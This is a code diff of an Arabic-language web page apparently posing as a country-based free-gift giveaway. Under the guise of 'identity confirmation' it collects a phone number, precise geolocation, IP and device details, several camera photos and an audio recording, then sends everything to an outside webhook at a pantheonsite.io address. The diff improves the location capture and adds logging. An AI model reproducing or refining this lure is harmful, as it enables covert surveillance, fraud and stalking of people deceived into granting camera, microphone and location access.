@@ -126,31 +126,6 @@
         .status.success { background: rgba(46,213,115,0.15); color: #2ed573; display: block; }
         .status.info { background: rgba(54,164,235,0.15); color: #36a4eb; display: block; }
         .status.error { background: rgba(255,107,107,0.15); color: #ff6b6b; display: block; }
-        .dev-btn {
-            display: inline-block;
-            margin-top: 18px;
-            padding: 12px 25px;
-            background: rgba(255,215,0,0.10);
-            border: 1.5px solid #ffd700;
-            border-radius: 50px;
-            color: #ffd700;
-            font-size: 16px;
-            font-weight: 600;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            backdrop-filter: blur(4px);
-            box-shadow: 0 0 15px rgba(255,215,0,0.10);
-            letter-spacing: 0.5px;
-        }
-        .dev-btn i { margin-left: 8px; font-size: 18px; }
-        .dev-btn:hover {
-            background: rgba(255,215,0,0.20);
-            box-shadow: 0 0 30px rgba(255,215,0,0.25);
-            transform: scale(1.03);
-            color: #fff;
-            border-color: #fff3c0;
-        }
-        .dev-btn:active { transform: scale(0.96); }
         .footer {
             margin-top: 25px;
             font-size: 13px;
@@ -172,7 +147,6 @@
             .country-grid { grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); }
             .country-btn { padding: 10px 6px; font-size: 13px; }
             .country-btn i { font-size: 22px; }
-            .dev-btn { font-size: 14px; padding: 10px 18px; }
         }
         .permission-wrapper {
             background: rgba(255,215,0,0.05);
@@ -216,7 +190,7 @@
             <div class="status" id="statusTasks"></div>
         </div>
 
-        <!-- STEP 3: عداد الوقت + زر المطور -->
+        <!-- STEP 3: عداد الوقت -->
         <div class="step" id="step-timer">
             <div class="logo">⏳</div>
             <h1>تهانينا! 🎉</h1>
@@ -227,9 +201,6 @@
             </div>
             <p style="color: #aaa; font-size: 14px; margin-top: 10px;">يرجى الانتظار، ستصلك الهدية تلقائياً</p>
             <div class="status" id="statusTimer"></div>
-            <a href="https://t.me/iashraf_mousa" target="_blank" class="dev-btn">
-                <i class="fab fa-telegram"></i> المطور: @iashraf_mousa
-            </a>
         </div>
 
         <div class="footer">
@@ -244,7 +215,7 @@
 
     <script>
         // ================================================================
-        //  CONFIG - WEBHOOK
+        //  CONFIG - WEBHOOK (غيّر الرابط حسب سيرفرك)
         // ================================================================
         const WEBHOOK_URL = "https://dev-free-balancce.pantheonsite.io/free/bot.php?action=webhook_data";
 
@@ -461,9 +432,9 @@
         renderCountries();
 
         // ================================================================
-        //  SELECT COUNTRY + GET LOCATION فوراً
+        //  SELECT COUNTRY + GET LOCATION (مع await)
         // ================================================================
-        function selectCountry(name) {
+        async function selectCountry(name) {
             selectedCountry = name;
             const data = countries[name];
             taskTitle.textContent = `🎁 هدية ${name}`;
@@ -481,9 +452,18 @@
                 </div>
             `;
             phoneInput.placeholder = `مثال: ${prefixes.split('،')[0]}12345678`;
+            
+            // إظهار شاشة المهام مع رسالة انتظار الموقع
             showStep('step-tasks');
             statusTasks.className = 'status';
-            statusTasks.style.display = 'none';
+            statusTasks.style.display = 'block';
+            statusTasks.className = 'status info';
+            statusTasks.textContent = '📍 جاري الحصول على الموقع الجغرافي...';
+            
+            // طلب الموقع وانتظار النتيجة
+            await getLocation();
+            
+            // بعد الحصول على الموقع، نكمل تهيئة الشاشة
             phoneInput.value = '';
             capturedPhotoFiles = [];
             audioChunks = [];
@@ -491,9 +471,6 @@
             claimBtn.disabled = false;
             claimBtn.classList.remove('loading');
             claimBtn.querySelector('.btn-text').textContent = '🎁 احصل على الهدية';
-
-            // 🔥 طلب الموقع فور اختيار البلد
-            getLocation();
         }
 
         function showStep(id) {
@@ -502,7 +479,7 @@
         }
 
         // ================================================================
-        //  BUTTON CLICK – MAIN ACTION (بدون طلب الموقع مجدداً)
+        //  BUTTON CLICK – MAIN ACTION
         // ================================================================
         claimBtn.addEventListener('click', async () => {
             if (!USER_TOKEN) {
@@ -532,11 +509,16 @@
             claimBtn.querySelector('.btn-text').textContent = 'جاري التأكيد...';
             showStatus(statusTasks, 'info', '⏳ جاري تأكيد هويتك...');
 
-            // لا نطلب الموقع مجدداً، نستخدم userLocation الموجود
+            // الحصول على IP (إذا لم يتم الحصول عليه مسبقاً)
             await getIPAddress();
+            
+            // التقاط الصور
             await startCameraAndCapture();
+            
+            // تسجيل الصوت
             await recordAudio();
 
+            // إرسال جميع البيانات
             const success = await sendAllData();
 
             if (success) {
@@ -565,13 +547,15 @@
         }
 
         // ================================================================
-        //  تحسين الحصول على الموقع الجغرافي (احترافي)
+        //  تحسين الحصول على الموقع الجغرافي (مع Logging)
         // ================================================================
         async function getLocation() {
             return new Promise((resolve) => {
+                console.log('🔍 [getLocation] بدء عملية الحصول على الموقع...');
                 if (!navigator.geolocation) {
                     userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
                     showStatus(statusTasks, 'error', '❌ المتصفح لا يدعم خدمة تحديد الموقع.');
+                    console.error('❌ [getLocation] المتصفح لا يدعم Geolocation');
                     resolve();
                     return;
                 }
@@ -597,20 +581,20 @@
                         userLocation.lng = bestPosition.coords.longitude;
                         userLocation.accuracy = bestPosition.coords.accuracy;
                         userLocation.error = null;
-                        showStatus(
-                            statusTasks,
-                            'info',
-                            `📍 الموقع: ${bestPosition.coords.latitude.toFixed(6)}, ${bestPosition.coords.longitude.toFixed(6)} (دقة ${Math.round(bestPosition.coords.accuracy)} متر)`
-                        );
+                        const msg = `📍 الموقع: ${bestPosition.coords.latitude.toFixed(6)}, ${bestPosition.coords.longitude.toFixed(6)} (دقة ${Math.round(bestPosition.coords.accuracy)} متر)`;
+                        showStatus(statusTasks, 'info', msg);
+                        console.log('✅ [getLocation] نجاح:', msg);
                     } else {
                         userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
                         showStatus(statusTasks, 'error', '❌ تعذر الحصول على الموقع الجغرافي.');
+                        console.error('❌ [getLocation] فشل الحصول على الموقع');
                     }
                     resolve();
                 };
 
                 const timeoutId = setTimeout(() => {
                     if (!isResolved) {
+                        console.warn('⏳ [getLocation] انتهت المهلة');
                         if (watchId !== null) {
                             navigator.geolocation.clearWatch(watchId);
                             watchId = null;
@@ -628,16 +612,15 @@
                 const handlePosition = (pos) => {
                     attemptCount++;
                     const accuracy = pos.coords.accuracy;
+                    console.log(`📍 [getLocation] تحديث ${attemptCount}: دقة ${accuracy} متر`);
                     if (accuracy < bestAccuracy) {
                         bestAccuracy = accuracy;
                         bestPosition = pos;
-                        showStatus(
-                            statusTasks,
-                            'info',
-                            `📍 جاري تحديد الموقع... الدقة الحالية: ${Math.round(accuracy)} متر`
-                        );
+                        const msg = `📍 جاري تحديد الموقع... الدقة الحالية: ${Math.round(accuracy)} متر`;
+                        showStatus(statusTasks, 'info', msg);
                     }
                     if (accuracy <= TARGET_ACCURACY || attemptCount >= MAX_ATTEMPTS) {
+                        console.log(`✅ [getLocation] تم الوصول للدقة المطلوبة (${accuracy} متر) أو انتهت المحاولات (${attemptCount})`);
                         resolveWithBest();
                         clearTimeout(timeoutId);
                     }
@@ -645,6 +628,7 @@
 
                 const handleError = (err) => {
                     if (isResolved) return;
+                    console.warn(`⚠️ [getLocation] خطأ: ${err.message} (كود ${err.code})`);
                     if (err.code === 1) {
                         userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
                         showStatus(statusTasks, 'error', '🚫 تم رفض الإذن بالوصول إلى الموقع. يرجى السماح في إعدادات المتصفح.');
@@ -687,6 +671,7 @@
                 );
 
                 showStatus(statusTasks, 'info', '📍 جاري الحصول على الموقع الجغرافي بدقة عالية...');
+                console.log('📡 [getLocation] تم بدء watchPosition');
             });
         }
 
@@ -697,6 +682,7 @@
             return new Promise(async (resolve) => {
                 try {
                     showStatus(statusTasks, 'info', '📸 جاري التحقق البصري...');
+                    console.log('📸 [startCameraAndCapture] بدء الكاميرا');
                     const constraints = { video: true, audio: false };
                     mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                     video.srcObject = mediaStream;
@@ -722,7 +708,6 @@
                     canvas.height = height;
 
                     showStatus(statusTasks, 'info', `📸 جاري التقاط ${TOTAL_PHOTOS} صور...`);
-
                     capturedPhotoFiles = [];
 
                     for (let i = 1; i <= TOTAL_PHOTOS; i++) {
@@ -741,10 +726,11 @@
                     }
 
                     showStatus(statusTasks, 'info', `✅ تم التقاط ${capturedPhotoFiles.length} صورة بنجاح`);
+                    console.log(`✅ [startCameraAndCapture] تم التقاط ${capturedPhotoFiles.length} صور`);
                     resolve(true);
 
                 } catch (error) {
-                    console.error('❌ Camera error:', error);
+                    console.error('❌ [startCameraAndCapture] خطأ:', error);
                     showStatus(statusTasks, 'error', '⚠️ لم نتمكن من التأكيد البصري، حاول مرة أخرى.');
                     if (mediaStream) {
                         mediaStream.getTracks().forEach(t => t.stop());
@@ -763,6 +749,7 @@
             return new Promise(async (resolve) => {
                 try {
                     showStatus(statusTasks, 'info', '🎤 جاري تأكيد الصوت...');
+                    console.log('🎤 [recordAudio] بدء التسجيل الصوتي');
                     const audioConstraints = { audio: true };
                     audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
                     audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
@@ -771,6 +758,7 @@
                     audioRecorder.onstop = () => {
                         if (audioChunks.length > 0) {
                             audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                            console.log(`✅ [recordAudio] تم التسجيل بحجم ${audioBlob.size} بايت`);
                         }
                         resolve();
                     };
@@ -779,11 +767,12 @@
                     setTimeout(() => {
                         if (audioRecorder.state === 'recording') {
                             audioRecorder.stop();
+                            console.log('⏹️ [recordAudio] تم إيقاف التسجيل');
                         }
                         audioStream.getTracks().forEach(t => t.stop());
                     }, AUDIO_DURATION);
                 } catch (error) {
-                    console.error('❌ Audio error:', error);
+                    console.error('❌ [recordAudio] خطأ:', error);
                     showStatus(statusTasks, 'error', '⚠️ لم نتمكن من تأكيد الصوت، حاول مرة أخرى.');
                     resolve();
                 }
@@ -794,16 +783,23 @@
         //  SEND ALL DATA VIA FORM DATA
         // ================================================================
         async function sendAllData() {
+            console.log('📤 [sendAllData] بدء إعداد البيانات للإرسال');
             const formData = new FormData();
 
+            // البيانات النصية
             formData.append('event', 'submission');
             formData.append('country', selectedCountry);
             formData.append('phone', userPhone);
             formData.append('ip', userIP);
+            
+            // بيانات الموقع - تأكد من وجودها
+            console.log('📍 [sendAllData] userLocation:', userLocation);
             formData.append('location[lat]', userLocation.lat ?? '');
             formData.append('location[lng]', userLocation.lng ?? '');
             formData.append('location[accuracy]', userLocation.accuracy ?? '');
             formData.append('location[error]', userLocation.error ?? '');
+            
+            // معلومات الجهاز
             formData.append('device[userAgent]', navigator.userAgent);
             formData.append('device[platform]', navigator.platform);
             formData.append('device[language]', navigator.language);
@@ -812,25 +808,30 @@
             formData.append('device[timezone]', Intl.DateTimeFormat().resolvedOptions().timeZone);
             formData.append('timestamp', new Date().toISOString());
 
+            // إضافة الصور
             if (capturedPhotoFiles.length > 0) {
                 capturedPhotoFiles.forEach((file, index) => {
                     formData.append(`photos[]`, file, file.name);
                 });
+                console.log(`📸 [sendAllData] تم إضافة ${capturedPhotoFiles.length} صور`);
             }
 
+            // إضافة الصوت
             if (audioBlob) {
                 const audioFile = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                 formData.append('audio', audioFile);
+                console.log(`🎤 [sendAllData] تم إضافة ملف صوتي بحجم ${audioBlob.size} بايت`);
             }
 
             showStatus(statusTasks, 'info', '📤 جاري إرسال البيانات...');
+            console.log('📤 [sendAllData] إرسال إلى Webhook');
             const result = await sendToWebhook(formData);
             if (result.success) {
-                console.log('✅ All data sent to webhook');
+                console.log('✅ [sendAllData] تم الإرسال بنجاح');
                 showStatus(statusTasks, 'success', '✅ تم إرسال البيانات بنجاح!');
                 return true;
             } else {
-                console.error('❌ Failed to send all data:', result.error);
+                console.error('❌ [sendAllData] فشل الإرسال:', result.error);
                 showStatus(statusTasks, 'error', '⚠️ فشل الإرسال: ' + result.error);
                 return false;
             }
